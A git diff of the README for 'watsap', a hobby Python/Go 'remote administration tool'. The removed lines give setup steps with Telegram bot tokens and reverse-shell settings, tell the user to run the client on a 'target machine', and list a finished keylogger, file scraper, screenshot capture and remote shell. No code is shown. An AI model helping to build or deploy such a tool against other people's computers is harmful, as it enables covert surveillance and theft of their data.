@@ -1,34 +1,11 @@
-# watsap
+# watsap legacy
 
-Remote system administration tool for Windows/Linux
+This is a first attempt at creating a watsap with python. works fine but getting binary output is a bit of a pain. So I decided to use golang for this project. final binary output is much better than python and binary size reduced from 13mb to 1.8mb. that's a huge difference imo. Thats not all, memory usage reduced from 60mb to only 4mb plus golang is much faster than python. I can get linux and windows binaries from the same code. I am happy with the result. I will be using golang for this project from now on.
 
-### why watsap?
-It's a meme comes from the whatsapp gold and 2 memes. First started as a joke to troll friends & learn python/go but then I decided to make it a real project. Still meme and comes with absolutely no warranty.
-
-### how to use?
-1. Clone the repository
-2. Create .env file with the following content:
-``` bash
-export TG_BOT_TOKEN="TOKEN"
-export TG_CHAT_ID="CHATID"
-export RSHELL_IP="IP" #Optional
-export RSHELL_PORT="PORT" #Optional
-```
-
-3. Run `build.sh` to build the client
-4. Run the client on the target machine
-
-## to-do:
-- [x] Add a way to run commands on the remote machine
-- [ ] Autoupdate the client
-- [x] Fix userid generation
-- [x] Modularize the code
-- [x] Add keylogger
-- [x] Add file scraper
-- [x] Add screenshot
-- [ ] Add webcam
-- [ ] Add microphone
-- [ ] Add remote desktop
-- [x] Add remote shell
-- [x] Better build script
-
+## How to use
+1. Clone the repo
+2. `python -m venv venv`
+3. `source venv/bin/activate`
+4. `pip install -r requirements.txt`
+5. Edit the `watsap.py` file and add your own TOKEN and CHAT_ID
+6. `python watsap.py` # Or use pyinstaller to create a binary
